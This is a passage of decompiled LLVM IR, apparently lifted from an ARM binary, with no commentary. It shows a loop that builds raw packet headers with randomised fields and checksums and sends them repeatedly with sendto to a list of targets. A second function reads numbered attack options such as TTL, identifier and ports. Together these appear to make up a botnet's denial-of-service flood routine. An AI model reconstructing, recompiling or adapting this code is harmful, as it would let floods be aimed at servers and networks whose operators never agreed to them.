  store i32 %v7_d45c, i32* @r5, align 4
  %v7_d460 = icmp eq i8 %v3_d458, 31
  store i1 %v7_d460, i1* %cpsr_z.global-to-local, align 1
  %v1_d464 = add i32 %v7_d45c, 20
  store i32 %v1_d464, i32* @r6, align 4
  %tmp101 = icmp ult i8 %v3_d458, 32
  br i1 %tmp101, label %dec_label_pc_d57c, label %dec_label_pc_d46c

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d448
  store i32 %v6_d124, i32* %r1.global-to-local, align 4
  store i1 %v3_d5d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d5d8, label %dec_label_pc_d5e4, label %dec_label_pc_d478

dec_label_pc_d478:                                ; preds = %dec_label_pc_d57c, %dec_label_pc_d46c
  store i32 %v3_d180, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_d5f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d5f4, label %dec_label_pc_d600, label %dec_label_pc_d48c

dec_label_pc_d48c:                                ; preds = %dec_label_pc_d5e4.dec_label_pc_d48c_crit_edge, %dec_label_pc_d478
  %v1_d490 = phi i32 [ %v1_d490.pre, %dec_label_pc_d5e4.dec_label_pc_d48c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), %dec_label_pc_d478 ]
  store i32 %v3_d184, i32* %r3.global-to-local, align 4
  %v9_d490 = icmp eq i32 %v3_d184, %v1_d490
  store i1 %v9_d490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d490, label %dec_label_pc_d61c, label %dec_label_pc_d498

dec_label_pc_d498:                                ; preds = %dec_label_pc_d600.dec_label_pc_d498_crit_edge, %dec_label_pc_d48c
  %v1_d49c = phi i32 [ %v1_d49c.pre, %dec_label_pc_d600.dec_label_pc_d498_crit_edge ], [ %v1_d490, %dec_label_pc_d48c ]
  store i32 %v3_d188, i32* %ip.global-to-local, align 4
  %v9_d49c = icmp eq i32 %v3_d188, %v1_d49c
  store i1 %v9_d49c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d49c, label %dec_label_pc_d638, label %dec_label_pc_d4a4

dec_label_pc_d4a4:                                ; preds = %dec_label_pc_d61c.dec_label_pc_d4a4_crit_edge, %dec_label_pc_d498
  %v1_d4a8 = phi i32 [ %v1_d4a8.pre, %dec_label_pc_d61c.dec_label_pc_d4a4_crit_edge ], [ %v1_d49c, %dec_label_pc_d498 ]
  store i32 %v5_d024, i32* %r1.global-to-local, align 4
  %v9_d4a8 = icmp eq i32 %v5_d024, %v1_d4a8
  store i1 %v9_d4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4a8, label %dec_label_pc_d654, label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d638.dec_label_pc_d4b0_crit_edge, %dec_label_pc_d4a4
  %v1_d4b4 = phi i32 [ %v1_d4b4.pre, %dec_label_pc_d638.dec_label_pc_d4b0_crit_edge ], [ %v1_d4a8, %dec_label_pc_d4a4 ]
  store i32 %v6_d040, i32* %r2.global-to-local, align 4
  %v9_d4b4 = icmp eq i32 %v6_d040, %v1_d4b4
  store i1 %v9_d4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4b4, label %dec_label_pc_d668, label %dec_label_pc_d4bc

dec_label_pc_d4bc:                                ; preds = %dec_label_pc_d654, %dec_label_pc_d4b0
  store i32 %v1_d110, i32* %r3.global-to-local, align 4
  store i1 %v2_d670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d670, label %dec_label_pc_d4c8, label %dec_label_pc_d67c

dec_label_pc_d4c8:                                ; preds = %dec_label_pc_d4bc, %dec_label_pc_d668, %dec_label_pc_d67c
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d4cc = load i32, i32* @r7, align 4
  %v1_d4cc = trunc i32 %v0_d4cc to i8
  %v2_d4cc = load i32, i32* @r5, align 4
  %v3_d4cc = add i32 %v2_d4cc, 10
  %v4_d4cc = inttoptr i32 %v3_d4cc to i8*
  store i8 %v1_d4cc, i8* %v4_d4cc, align 1
  %v0_d4d0 = load i32, i32* @r7, align 4
  %v1_d4d0 = trunc i32 %v0_d4d0 to i8
  %v2_d4d0 = load i32, i32* @r5, align 4
  %v3_d4d0 = add i32 %v2_d4d0, 11
  %v4_d4d0 = inttoptr i32 %v3_d4d0 to i8*
  store i8 %v1_d4d0, i8* %v4_d4d0, align 1
  %v0_d4d4 = load i32, i32* @r5, align 4
  store i32 %v0_d4d4, i32* @r0, align 4
  %v2_d4d8 = call i32 @function_ddf4(i32 %v0_d4d4, i32 20)
  %v3_d4d8 = trunc i32 %v2_d4d8 to i8
  %v4_d4dc29 = udiv i32 %v2_d4d8, 256
  %v1_d4e0 = trunc i32 %v4_d4dc29 to i8
  %v2_d4e0 = load i32, i32* @r5, align 4
  %v3_d4e0 = add i32 %v2_d4e0, 11
  %v4_d4e0 = inttoptr i32 %v3_d4e0 to i8*
  store i8 %v1_d4e0, i8* %v4_d4e0, align 1
  %v3_d4e4 = load i32, i32* @r5, align 4
  %v4_d4e4 = add i32 %v3_d4e4, 10
  %v5_d4e4 = inttoptr i32 %v4_d4e4 to i8*
  store i8 %v3_d4d8, i8* %v5_d4e4, align 1
  %v0_d4e8 = load i32, i32* @r6, align 4
  store i32 %v0_d4e8, i32* @r1, align 4
  %v0_d4ec = load i32, i32* @sl, align 4
  store i32 %v0_d4ec, i32* %r2.global-to-local, align 4
  %v0_d4f0 = load i32, i32* @r8, align 4
  store i32 %v0_d4f0, i32* %r3.global-to-local, align 4
  %v0_d4f4 = load i32, i32* @r7, align 4
  %v1_d4f4 = trunc i32 %v0_d4f4 to i8
  %v3_d4f4 = add i32 %v0_d4e8, 16
  %v4_d4f4 = inttoptr i32 %v3_d4f4 to i8*
  store i8 %v1_d4f4, i8* %v4_d4f4, align 1
  %v0_d4f8 = load i32, i32* @r7, align 4
  %v1_d4f8 = trunc i32 %v0_d4f8 to i8
  %v2_d4f8 = load i32, i32* @r6, align 4
  %v3_d4f8 = add i32 %v2_d4f8, 17
  %v4_d4f8 = inttoptr i32 %v3_d4f8 to i8*
  store i8 %v1_d4f8, i8* %v4_d4f8, align 1
  %v0_d4fc = load i32, i32* @r5, align 4
  %v4_d500 = call i32 @function_de50(i32 %v0_d4fc, i32 %v0_d4e8, i32 %v0_d4ec, i32 %v0_d4f0)
  %v5_d500 = trunc i32 %v4_d500 to i8
  %v4_d50430 = udiv i32 %v4_d500, 256
  %v1_d508 = trunc i32 %v4_d50430 to i8
  %v2_d508 = load i32, i32* @r6, align 4
  %v3_d508 = add i32 %v2_d508, 17
  %v4_d508 = inttoptr i32 %v3_d508 to i8*
  store i8 %v1_d508, i8* %v4_d508, align 1
  %v3_d50c = load i32, i32* @r6, align 4
  %v4_d50c = add i32 %v3_d50c, 16
  %v5_d50c = inttoptr i32 %v4_d50c to i8*
  store i8 %v5_d500, i8* %v5_d50c, align 1
  %v3_d510 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d510, i32* %r3.global-to-local, align 4
  %v0_d514 = load i32, i32* @r5, align 4
  %v1_d514 = add i32 %v0_d514, 20
  %v2_d514 = inttoptr i32 %v1_d514 to i32*
  %v3_d514 = load i32, i32* %v2_d514, align 4
  %v3_d51c = udiv i32 %v3_d514, 65536
  store i32 %v3_d51c, i32* %r2.global-to-local, align 4
  %v5_d520 = mul i32 %v3_d510, 24
  %v1_d524 = load i32, i32* @sb, align 4
  %v2_d524 = add i32 %v1_d524, %v5_d520
  store i32 %v2_d524, i32* %ip.global-to-local, align 4
  %v3_d52828 = udiv i32 %v3_d514, 16777216
  %v1_d52c = trunc i32 %v3_d52828 to i8
  %v3_d52c = add i32 %v2_d524, 3
  %v4_d52c = inttoptr i32 %v3_d52c to i8*
  store i8 %v1_d52c, i8* %v4_d52c, align 1
  %v0_d530 = load i32, i32* %r2.global-to-local, align 4
  %v1_d530 = trunc i32 %v0_d530 to i8
  %v2_d530 = load i32, i32* %ip.global-to-local, align 4
  %v3_d530 = add i32 %v2_d530, 2
  %v4_d530 = inttoptr i32 %v3_d530 to i8*
  store i8 %v1_d530, i8* %v4_d530, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d538 = load i32, i32* @r5, align 4
  store i32 %v0_d538, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-168.0.ph, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_d548 = load i32, i32* %ip.global-to-local, align 4
  %v4_d548 = inttoptr i32 %v0_d548 to %sockaddr*
  %v7_d550 = inttoptr i32 %v0_d538 to i32*
  %v9_d550 = call i32 @sendto(i32 %v3_d138, i32* %v7_d550, i32 %stack_var_-168.0.ph, i32 16384, %sockaddr* %v4_d548, i32 16)
  %v3_d554 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d554, i32* %r3.global-to-local, align 4
  %v1_d558 = add i32 %v3_d554, 1
  %v0_d55c = load i32, i32* @fp, align 4
  %v9_d55c = icmp eq i32 %v0_d55c, %v1_d558
  store i1 %v9_d55c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d558, i32* %stack_var_-40, align 4
  %v7_d564 = icmp sgt i32 %v0_d55c, %v1_d558
  br i1 %v7_d564, label %dec_label_pc_d448, label %dec_label_pc_d420

dec_label_pc_d56c:                                ; preds = %dec_label_pc_d148
  %v1_d570 = call i32 @close(i32 %v3_d138)
  br label %dec_label_pc_d574

dec_label_pc_d574:                                ; preds = %dec_label_pc_cf34, %dec_label_pc_d56c
  %v29_d578 = phi i32 [ -1, %dec_label_pc_cf34 ], [ %v1_d570, %dec_label_pc_d56c ]
  store i32 %v3_cf34, i32* %r4.global-to-local, align 4
  ret i32 %v29_d578

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d448
  %v1_d57c = add i32 %v2_d450, 16
  %v2_d57c = inttoptr i32 %v1_d57c to i32*
  %v3_d57c = load i32, i32* %v2_d57c, align 4
  store i32 %v3_d57c, i32* %r4.global-to-local, align 4
  %v0_d580 = call i32 @function_f67c()
  %v3_d584 = load i32, i32* %stack_var_-40, align 4
  %v5_d58c = mul i32 %v3_d584, 24
  %v1_d594 = load i32, i32* @sb, align 4
  %v2_d594 = add i32 %v1_d594, %v5_d58c
  store i32 %v2_d594, i32* %r1.global-to-local, align 4
  %v1_d598 = and i32 %v3_d57c, 65280
  store i32 %v1_d598, i32* %r3.global-to-local, align 4
  %v1_d590 = udiv i32 %v3_d57c, 256
  %v3_d59c = and i32 %v1_d590, 65280
  store i32 %v3_d59c, i32* %r2.global-to-local, align 4
  %v3_d5a0 = mul i32 %v3_d57c, 16777216
  store i32 %v3_d5a0, i32* %ip.global-to-local, align 4
  %v1_d5a4 = add i32 %v2_d594, 20
  %v2_d5a4 = inttoptr i32 %v1_d5a4 to i8*
  %v3_d5a4 = load i8, i8* %v2_d5a4, align 1
  %v4_d5a4 = zext i8 %v3_d5a4 to i32
  %v4_d5a8 = mul nuw nsw i32 %v1_d598, 256
  %v5_d5a8 = or i32 %v4_d5a8, %v3_d5a0
  store i32 %v5_d5a8, i32* %ip.global-to-local, align 4
  %v2_d5b0 = call i32 @llvm.bswap.i32(i32 %v3_d57c)
  %v7_d5b4 = lshr i32 %v0_d580, %v4_d5a4
  %v8_d5b4 = add i32 %v7_d5b4, %v2_d5b0
  store i32 %v8_d5b4, i32* %r2.global-to-local, align 4
  %v2_d5d0 = call i32 @llvm.bswap.i32(i32 %v8_d5b4)
  store i32 %v2_d5d0, i32* %r3.global-to-local, align 4
  store i32 %v6_d124, i32* %r1.global-to-local, align 4
  store i1 %v3_d5d8, i1* %cpsr_z.global-to-local, align 1
  %v1_d5dc = load i32, i32* @r5, align 4
  %v2_d5dc = add i32 %v1_d5dc, 16
  %v3_d5dc = inttoptr i32 %v2_d5dc to i32*
  store i32 %v2_d5d0, i32* %v3_d5dc, align 4
  br i1 %v3_d5d8, label %dec_label_pc_d5e4, label %dec_label_pc_d478

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d57c, %dec_label_pc_d46c
  %v0_d5e4 = call i32 @function_f67c()
  store i32 %v3_d180, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_d5f4, i1* %cpsr_z.global-to-local, align 1
  %v1_d5f8 = load i32, i32* @r5, align 4
  %v2_d5f8 = add i32 %v1_d5f8, 12
  %v3_d5f8 = inttoptr i32 %v2_d5f8 to i32*
  store i32 %v0_d5e4, i32* %v3_d5f8, align 4
  br i1 %v9_d5f4, label %dec_label_pc_d600, label %dec_label_pc_d5e4.dec_label_pc_d48c_crit_edge

dec_label_pc_d5e4.dec_label_pc_d48c_crit_edge:    ; preds = %dec_label_pc_d5e4
  %v1_d490.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d48c

dec_label_pc_d600:                                ; preds = %dec_label_pc_d5e4, %dec_label_pc_d478
  %v0_d600 = call i32 @function_f67c()
  %v1_d600 = trunc i32 %v0_d600 to i8
  %v4_d60431 = udiv i32 %v0_d600, 256
  %v1_d608 = trunc i32 %v4_d60431 to i8
  %v2_d608 = load i32, i32* @r5, align 4
  %v3_d608 = add i32 %v2_d608, 5
  %v4_d608 = inttoptr i32 %v3_d608 to i8*
  store i8 %v1_d608, i8* %v4_d608, align 1
  store i32 %v3_d184, i32* %r3.global-to-local, align 4
  %v1_d610 = load i32, i32* @r4, align 4
  %v9_d610 = icmp eq i32 %v3_d184, %v1_d610
  store i1 %v9_d610, i1* %cpsr_z.global-to-local, align 1
  %v3_d614 = load i32, i32* @r5, align 4
  %v4_d614 = add i32 %v3_d614, 4
  %v5_d614 = inttoptr i32 %v4_d614 to i8*
  store i8 %v1_d600, i8* %v5_d614, align 1
  %v0_d618 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d618, label %dec_label_pc_d61c, label %dec_label_pc_d600.dec_label_pc_d498_crit_edge

dec_label_pc_d600.dec_label_pc_d498_crit_edge:    ; preds = %dec_label_pc_d600
  %v1_d49c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d498

dec_label_pc_d61c:                                ; preds = %dec_label_pc_d600, %dec_label_pc_d48c
  %v0_d61c = call i32 @function_f67c()
  %v1_d61c = trunc i32 %v0_d61c to i8
  store i32 %v3_d188, i32* %ip.global-to-local, align 4
  %v4_d624 = sdiv i32 %v0_d61c, 256
  store i32 %v4_d624, i32* %r3.global-to-local, align 4
  %v1_d628 = load i32, i32* @r4, align 4
  %v9_d628 = icmp eq i32 %v3_d188, %v1_d628
  store i1 %v9_d628, i1* %cpsr_z.global-to-local, align 1
  %v3_d62c = load i32, i32* @r5, align 4
  %v4_d62c = add i32 %v3_d62c, 20
  %v5_d62c = inttoptr i32 %v4_d62c to i8*
  store i8 %v1_d61c, i8* %v5_d62c, align 1
  %v0_d630 = load i32, i32* %r3.global-to-local, align 4
  %v1_d630 = trunc i32 %v0_d630 to i8
  %v2_d630 = load i32, i32* @r6, align 4
  %v3_d630 = add i32 %v2_d630, 1
  %v4_d630 = inttoptr i32 %v3_d630 to i8*
  store i8 %v1_d630, i8* %v4_d630, align 1
  %v0_d634 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d634, label %dec_label_pc_d638, label %dec_label_pc_d61c.dec_label_pc_d4a4_crit_edge

dec_label_pc_d61c.dec_label_pc_d4a4_crit_edge:    ; preds = %dec_label_pc_d61c
  %v1_d4a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4a4

dec_label_pc_d638:                                ; preds = %dec_label_pc_d61c, %dec_label_pc_d498
  %v0_d638 = call i32 @function_f67c()
  %v1_d638 = trunc i32 %v0_d638 to i8
  store i32 %v5_d024, i32* %r1.global-to-local, align 4
  %v4_d640 = sdiv i32 %v0_d638, 256
  store i32 %v4_d640, i32* %r3.global-to-local, align 4
  %v1_d644 = load i32, i32* @r4, align 4
  %v9_d644 = icmp eq i32 %v5_d024, %v1_d644
  store i1 %v9_d644, i1* %cpsr_z.global-to-local, align 1
  %v1_d648 = trunc i32 %v4_d640 to i8
  %v2_d648 = load i32, i32* @r6, align 4
  %v3_d648 = add i32 %v2_d648, 3
  %v4_d648 = inttoptr i32 %v3_d648 to i8*
  store i8 %v1_d648, i8* %v4_d648, align 1
  %v3_d64c = load i32, i32* @r6, align 4
  %v4_d64c = add i32 %v3_d64c, 2
  %v5_d64c = inttoptr i32 %v4_d64c to i8*
  store i8 %v1_d638, i8* %v5_d64c, align 1
  %v0_d650 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d650, label %dec_label_pc_d654, label %dec_label_pc_d638.dec_label_pc_d4b0_crit_edge

dec_label_pc_d638.dec_label_pc_d4b0_crit_edge:    ; preds = %dec_label_pc_d638
  %v1_d4b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4b0

dec_label_pc_d654:                                ; preds = %dec_label_pc_d638, %dec_label_pc_d4a4
  %v0_d654 = call i32 @function_f67c()
  store i32 %v6_d040, i32* %r2.global-to-local, align 4
  %v1_d65c = load i32, i32* @r4, align 4
  %v9_d65c = icmp eq i32 %v6_d040, %v1_d65c
  store i1 %v9_d65c, i1* %cpsr_z.global-to-local, align 1
  %v1_d660 = load i32, i32* @r6, align 4
  %v2_d660 = add i32 %v1_d660, 4
  %v3_d660 = inttoptr i32 %v2_d660 to i32*
  store i32 %v0_d654, i32* %v3_d660, align 4
  br i1 %v9_d65c, label %dec_label_pc_d668, label %dec_label_pc_d4bc

dec_label_pc_d668:                                ; preds = %dec_label_pc_d654, %dec_label_pc_d4b0
  %v0_d668 = call i32 @function_f67c()
  store i32 %v1_d110, i32* %r3.global-to-local, align 4
  store i1 %v2_d670, i1* %cpsr_z.global-to-local, align 1
  %v1_d674 = load i32, i32* @r6, align 4
  %v2_d674 = add i32 %v1_d674, 8
  %v3_d674 = inttoptr i32 %v2_d674 to i32*
  store i32 %v0_d668, i32* %v3_d674, align 4
  br i1 %v2_d670, label %dec_label_pc_d4c8, label %dec_label_pc_d67c

dec_label_pc_d67c:                                ; preds = %dec_label_pc_d4bc, %dec_label_pc_d668
  %v0_d67c = load i32, i32* @r5, align 4
  %v1_d67c = add i32 %v0_d67c, 40
  store i32 %v6_d0e8, i32* @r1, align 4
  %v1_d684 = inttoptr i32 %v1_d67c to i8*
  %v2_d684 = call i32 @function_f7fc(i8* %v1_d684)
  br label %dec_label_pc_d4c8

dec_label_pc_d68c:                                ; preds = %dec_label_pc_d170
  store i32 %v6_d0e8, i32* %r3.global-to-local, align 4
  %v1_d694 = add i32 %v6_d0e8, 40
  store i32 %v1_d694, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d420.preheader

; uselistorder directives
  uselistorder i32 %v1_d694, { 1, 0 }
  uselistorder i32 %v4_d640, { 1, 0 }
  uselistorder i32 %v2_d5d0, { 1, 0 }
  uselistorder i32 %v3_d5a0, { 1, 0 }
  uselistorder i32 %v3_d57c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_d55c, { 1, 2, 0 }
  uselistorder i32 %v1_d558, { 2, 0, 3, 1 }
  uselistorder i32 %v0_d4e8, { 1, 0, 2 }
  uselistorder i32 %v0_d42c, { 2, 0, 1 }
  uselistorder i32 %v0_d420, { 1, 0 }
  uselistorder i1 %v2_d670, { 2, 3, 1, 0 }
  uselistorder i1 %v9_d5f4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_d5d8, { 3, 2, 1, 0 }
  uselistorder i32 %v1_d408, { 1, 0, 2, 3 }
  uselistorder i8 %v5_d26c, { 1, 0 }
  uselistorder i32 %v1_d234, { 1, 0 }
  uselistorder i32 %v1_d230, { 1, 0 }
  uselistorder i32 %v1_d22c, { 1, 0 }
  uselistorder i32 %v1_d208, { 1, 0 }
  uselistorder i32 %v1_d204, { 1, 0 }
  uselistorder i32 %v1_d200, { 1, 0 }
  uselistorder i32 %v1_d1f4, { 1, 0 }
  uselistorder i32 %v1_d1d0, { 1, 0 }
  uselistorder i32 %v1_d1c0, { 1, 0 }
  uselistorder i32 %v1_d1ac, { 3, 0, 2, 1 }
  uselistorder i32 %v0_d18c, { 1, 0, 2 }
  uselistorder i32 %v3_d180, { 1, 2, 0, 3 }
  uselistorder i32 %v0_d174, { 3, 0, 1, 2 }
  uselistorder i32 %v0_d170, { 0, 2, 1, 3 }
  uselistorder i32 %v3_d138, { 1, 2, 0, 3 }
  uselistorder i32 %v6_d124, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_d110, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_d0e8, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32 %v6_d040, { 3, 2, 1, 0 }
  uselistorder i32 %v5_d024, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v1_cfd4, { 1, 0 }
  uselistorder i32 %v6_cf6c, { 1, 0 }
  uselistorder i32 %v4_cf54, { 0, 3, 1, 2 }
  uselistorder i32 %v1_cf38, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 31, 29, 30, 32, 33, 34, 35, 36, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
  uselistorder label %dec_label_pc_d67c, { 1, 0 }
  uselistorder label %dec_label_pc_d574, { 1, 0 }
  uselistorder label %dec_label_pc_d4c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d420.preheader, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d6a8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d6a8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_d6a8 = load i32, i32* @r4, align 4
  %v6_d6a8 = load i32, i32* @r5, align 4
  %v9_d6a8 = load i32, i32* @r6, align 4
  %v12_d6a8 = load i32, i32* @r7, align 4
  %v1_d6ac = urem i32 %arg1, 256
  store i32 %v1_d6ac, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_d6ac, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_d6c4 = urem i32 %arg3, 256
  store i32 %v1_d6c4, i32* @r4, align 4
  %v2_d6c8 = call i32* @calloc(i32 %v1_d6ac, i32 4)
  %v3_d6c8 = ptrtoint i32* %v2_d6c8 to i32
  %v0_d6cc = load i32, i32* @r5, align 4
  store i32 %v0_d6cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v3_d6c8, i32* %fp.global-to-local, align 4
  %v0_d6dc = load i32, i32* @r4, align 4
  store i32 %v0_d6dc, i32* %r0.global-to-local, align 4
  %v4_d6e0 = inttoptr i32 %v0_d6cc to i32*
  %v5_d6e0 = call i32 @function_92dc(i32 %v0_d6dc, i32* %v4_d6e0, i32 2, i32 0)
  %v1_d6ec = urem i32 %v5_d6e0, 256
  store i32 %v1_d6ec, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d6f8 = load i32, i32* @r5, align 4
  store i32 %v0_d6f8, i32* %r1.global-to-local, align 4
  %v0_d6fc = load i32, i32* @r4, align 4
  store i32 %v0_d6fc, i32* %r0.global-to-local, align 4
  %v5_d700 = trunc i32 %v5_d6e0 to i8
  %v6_d704 = inttoptr i32 %v0_d6f8 to i32*
  %v7_d704 = call i32 @function_92dc(i32 %v0_d6fc, i32* %v6_d704, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_d708 = load i32, i32* @r5, align 4
  store i32 %v0_d708, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d718 = load i32, i32* @r4, align 4
  store i32 %v0_d718, i32* %r0.global-to-local, align 4
  %v5_d71c = inttoptr i32 %v0_d708 to i32*
  %v6_d71c = call i32 @function_92dc(i32 %v0_d718, i32* %v5_d71c, i32 4, i32 64)
  %v1_d724 = urem i32 %v6_d71c, 256
  store i32 %v1_d724, i32* %ip.global-to-local, align 4
  %v0_d728 = load i32, i32* @r5, align 4
  store i32 %v0_d728, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d734 = load i32, i32* @r4, align 4
  store i32 %v0_d734, i32* %r0.global-to-local, align 4
  %v6_d73c = inttoptr i32 %v0_d728 to i32*
  %v7_d73c = call i32 @function_92dc(i32 %v0_d734, i32* %v6_d73c, i32 5, i32 1)
  %v1_d748 = urem i32 %v7_d73c, 256
  store i32 %v1_d748, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d754 = load i32, i32* @r5, align 4
  store i32 %v0_d754, i32* %r1.global-to-local, align 4
  %v0_d758 = load i32, i32* @r4, align 4
  store i32 %v0_d758, i32* %r0.global-to-local, align 4
  %v5_d760 = inttoptr i32 %v0_d754 to i32*
  %v6_d760 = call i32 @function_92dc(i32 %v0_d758, i32* %v5_d760, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_d768 = load i32, i32* @r5, align 4
  store i32 %v0_d768, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_d760, i32* @r7, align 4
  %v0_d778 = load i32, i32* @r4, align 4
  store i32 %v0_d778, i32* %r0.global-to-local, align 4
  %v4_d77c = inttoptr i32 %v0_d768 to i32*
  %v5_d77c = call i32 @function_92dc(i32 %v0_d778, i32* %v4_d77c, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_d784 = load i32, i32* @r5, align 4
  store i32 %v0_d784, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_d77c, i32* @r6, align 4
  %v0_d794 = load i32, i32* @r4, align 4
  store i32 %v0_d794, i32* %r0.global-to-local, align 4
  %v4_d798 = inttoptr i32 %v0_d784 to i32*
  %v5_d798 = call i32 @function_92dc(i32 %v0_d794, i32* %v4_d798, i32 17, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_d79c = load i32, i32* @r5, align 4
  store i32 %v0_d79c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d7ac = load i32, i32* @r4, align 4
  store i32 %v0_d7ac, i32* %r0.global-to-local, align 4
  %v5_d7b0 = inttoptr i32 %v0_d79c to i32*
  %v6_d7b0 = call i32 @function_92dc(i32 %v0_d7ac, i32* %v5_d7b0, i32 18, i32 0)
  %v0_d7b4 = load i32, i32* @r5, align 4
  store i32 %v0_d7b4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d7c4 = load i32, i32* @r4, align 4
  store i32 %v0_d7c4, i32* %r0.global-to-local, align 4
  %v5_d7c8 = inttoptr i32 %v0_d7b4 to i32*
  %v6_d7c8 = call i32 @function_92dc(i32 %v0_d7c4, i32* %v5_d7c8, i32 11, i32 0)
